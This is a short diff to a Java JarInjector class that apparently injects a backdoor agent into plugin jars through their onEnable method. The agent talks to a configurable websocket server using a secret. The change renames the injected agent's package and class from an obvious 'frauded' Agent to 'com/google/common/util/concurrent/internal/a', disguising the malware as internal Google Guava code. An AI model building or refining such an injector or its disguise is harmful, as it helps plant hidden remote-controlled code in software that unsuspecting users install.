@@ -34,8 +34,8 @@ public class JarInjector {
   private final File input, output;
   private final String platform, server, secret;
 
-  private static final String AGENT_PKG = "org/apache/commons/frauded/";
-  private static final String AGENT_CLASS = AGENT_PKG + "Agent.class";
+  private static final String AGENT_PKG = "com/google/common/util/concurrent/internal/";
+  private static final String AGENT_CLASS = AGENT_PKG + "a.class";
 
   public JarInjector(File input, File output, String platform, String server, String secret) {
     this.input = input; this.output = output;
@@ -97,7 +97,7 @@ public class JarInjector {
   private byte[] injectOnEnable(byte[] classData) {
     ClassReader cr = new ClassReader(classData);
     ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS);
-    String agentClass = AGENT_PKG + "Agent";
+    String agentClass = AGENT_PKG + "a";
     String agentDesc = "(Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;)V";
     String sv = (server != null && !server.isEmpty()) ? server : "ws://localhost:8080/ws";
     String sc = (secret != null) ? secret : "";
